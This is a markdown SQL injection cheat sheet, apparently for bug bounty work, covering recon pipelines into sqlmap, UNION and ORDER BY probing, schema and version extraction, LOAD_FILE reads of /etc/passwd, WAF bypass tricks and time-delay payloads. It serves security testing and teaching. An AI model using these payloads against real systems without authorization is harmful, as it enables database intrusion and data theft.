# SQL Injection
Here are some quick methods to detect the SQL Injection vulnerability, though the methods are not limited. There are various tricks and tools.

# Methods To Find Sqli

## 1. Using Burpsuite :
```
  1. Capture the request using burpsuite.
  2. Send the request to burp scanner.
  3. Proceed with active scan.
  4. Once the scan is finished, look for SQL vulnerability that has been detected.
  5. Manually try SQL injection payloads.
  6. Use SQLMAP to speed up the process.
```
## 2. Using waybackurls and other bunch of tools :
```
  1. sublist3r -d target | tee -a domains (you can use other tools like findomain, assetfinder, etc.)
  2. cat domains | httpx | tee -a alive
  3. cat alive | waybackurls | tee -a urls
  4. gf sqli urls >> sqli
  5. sqlmap -m sqli --dbs --batch
  6. use tamper scripts
```
* More Details in this source thread [https://twitter.com/El3ctr0Byt3s/status/1302706241240731649](https://twitter.com/El3ctr0Byt3s/status/1302706241240731649)

## 3. Using heuristic scan to get hidden parameters :
```
  1. Use subdomain enumeration tools on the domain.
  2. Gather all urls using hakcrawler, waybackurls, gau for the domain and subdomains.
  3. You can use the same method described above in 2nd point.
  4. Use Arjun to scan for the hidden params in the urls. 
  5. Use --urls flag to include all urls.
  6. Check the params as https://domain.com?<hiddenparam>=<value>
  7. Send request to file and process it through sqlmap.
```
## 4. Error generation with untrusted input or special characters :
```
  1. Submit single quote character ' & look for errors.
  2. Submit SQL specific query.
  3. Submit Boolean conditions such as or 1=1 and or 1=0, and looking application's response.
  4. Submit certain payloads that results in time delay.
```
# Post-Methods
## 1. Finding total number of columns with order by or group by or having :
```
  Submit a series of ORDER BY clause such as 
	  
    ' ORDER BY 1 --
	  ' ORDER BY 2 --
    ' ORDER BY 3 --
    
    and incrementing specified column index until an error occurs.
```
## 2. Finding vulnerable columns with union operator :
```
  Submit a series of UNION SELECT payloads.
  
	  ' UNION SELECT NULL --
    ' UNION SELECT NULL, NULL --
    ' UNION SELECT NULL, NULL, NULL --
    
  (Using NULL maximizes the probability that the payload will succeed. NULL can be converted to every commonly used data type.)
```
* To go for the methods in more detail, go through portswigger site.
  
  https://portswigger.net/web-security/sql-injection/union-attacks

## 3. Extracting basic information like database(), version(), user(), UUID() with concat() or group_concat()

### 1. Database version
```
    Oracle 			  SELECT banner FROM v$version
		       		  SELECT version FROM v$instance
    
    Microsoft 			  SELECT @@version
    
    PostgreSQL 			  SELECT version()
    
    MySQL 			  SELECT @@version
```
### 2. Database contents
```
    Oracle        SELECT * FROM all_tables
	          SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
    
    Microsoft 	  SELECT * FROM information_schema.tables
                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    
    PostgreSQL 	  SELECT * FROM information_schema.tables
                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

    MySQL         SELECT * FROM information_schema.tables
                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
### 3. Shows version, user and database name
```
   ' AND 1=2 UNION ALL SELECT concat_ws(0x3a,version(),user(),database())
```
### 4. Using group_concat() function, used to concat all the rows of the returned results.
```  
   ' union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()–
```
## 4. Accessing system files with load_file(). and advance exploitation afterwards :
```
   ' UNION ALL SELECT LOAD_FILE ('/ etc / passwd')
```
## 5. Bypassing WAF :

### 1. Using Null byte before SQL query.
```
    %00' UNION SELECT password FROM Users WHERE username-'xyz'--
```
### 2. Using SQL inline comment sequence.
```
    '/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'-- 
```
### 3. URL encoding
```      
      for example :
    / URL encoded to %2f
    * URL encoded to %2a

    Can also use double encoding, if single encoding doesn't works. Use hex encoding if the rest doesn't work.
```
### 4. Changing Cases (uppercase/lowercase)
* For more step wise detailed methods, go through the link below.

  https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
### 5. Use SQLMAP tamper scripts. It helps bypass WAF/IDS/IPS.
* 1. Use Atlas. It helps suggesting tamper scripts for SQLMAP.
     
     https://github.com/m4ll0k/Atlas
* 2. JHaddix post on SQLMAP tamper scripts.
     
     https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423
        
## 6. Time Delays :
```
      Oracle 	      dbms_pipe.receive_message(('a'),10)
      
      Microsoft 	  WAITFOR DELAY '0:0:10'
      
      PostgreSQL 	  SELECT pg_sleep(10)
      
      MySQL 	      SELECT sleep(10) 
```      
## 7. Conditional Delays :
```
      Oracle 	      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
      
      Microsoft 	  IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
      
      PostgreSQL 	  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
      
      MySQL 	      SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 
```      
# Resources and tools that will help gain an upper hand on finding bugs :
* Portswigger SQL Injection cheat sheet - https://portswigger.net/web-security/sql-injection/cheat-sheet
* HTTPX - https://github.com/encode/httpx
* GF patterns - https://github.com/1ndianl33t/Gf-Patterns
* GF (Tomnomnom)- https://github.com/tomnomnom/gf
* We can also use gau with waybackurls to fetch all urls.
* Waybackurls - https://github.com/tomnomnom/waybackurls
* Gau - https://github.com/lc/gau
* Arjun - https://github.com/s0md3v/Arjun
* Hakcrawler - https://github.com/hakluke/hakrawler


### Author :

* [@xhan1x](https://twitter.com/xhan1x)
